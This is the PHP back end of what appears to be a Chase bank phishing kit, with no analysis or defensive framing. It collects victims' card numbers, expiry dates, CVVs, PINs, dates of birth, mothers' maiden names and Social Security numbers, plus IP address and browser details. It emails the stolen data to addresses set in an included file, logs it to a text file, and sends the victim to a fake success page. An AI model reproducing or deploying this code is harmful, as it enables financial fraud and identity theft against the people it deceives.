<?php
$name =  generateRandomString();
function generateRandomString($length = 24) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
if($_POST["chatol"] != "" and $_POST["exp90878"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Chase Info-----------------------\n";
$message .= "|cc  : ".$_POST['chatol']."\n";
$message .= "|exp date: ".$_POST['exp90878']."\n";
$message .= "|ccv  : ".$_POST['cvc908']."\n";
$message .= "|pins: ".$_POST['pnimta']."\n";
$message .= "|dob: ".$_POST['dob676']."\n";
$message .= "|MMN: ".$_POST['do090b']."\n";
$message .= "|SSN: ".$_POST['ssnn89']."\n";

$message .= "|--------------- DC -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- DC --------------|\n";
include 'emfill.php';
$subject = "Chase| ".$ip."\n";
mail(','.$form,$subject,$message);
    $text = fopen('sgh.txt', 'a');
fwrite($text, $message);
mail($to,$subject,$message);
$praga=(rand(10,100));

header('Location:success.php?cmd=login_submit&id'.$name.''.$name);
}else{
header ("Location: index.php");
}

?>

 
 